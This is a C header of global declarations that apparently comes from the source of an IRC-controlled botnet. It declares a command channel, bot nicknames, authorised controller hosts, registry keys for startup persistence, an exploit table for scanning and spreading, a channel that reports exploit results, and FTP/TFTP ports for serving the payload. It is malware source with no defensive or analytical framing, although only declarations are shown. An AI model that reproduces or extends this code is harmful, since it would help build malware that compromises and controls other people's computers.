#pragma pack(1)
extern SOCKET csock[64];       // thread sockets

extern THREAD threads[MAXTHREADS]; //new thread handles

extern char pbuff[65500];      // packet buffer
#ifndef NO_PING
extern BOOL noicmp;            // if true, icmp.dll is available
#endif
extern BOOL noigcs;
extern BOOL noigcse;
extern HANDLE ih;              // internet handle

extern int port;
extern BOOL regrun;

extern char valuename[];
extern char tempdir[256];
extern char channel[];
extern char filename[];
extern int maxrand;
extern int nicktype;
extern BOOL nickprefix;
extern char *authost[];
extern char nickconst[];

extern char regkey1[];
extern char regkey2[];
extern char regkey3[];
extern char regkey4[];

#ifdef _DEBUG
extern char logbuf[1024];
extern HANDLE mhStdOut;
#endif

#ifndef NO_ADVSCAN
extern EXPLOIT exploit[];
#endif

extern char exploitchan[];					// Channel where exploit messages get redirected
extern int FTP_PORT;
extern int tftpport;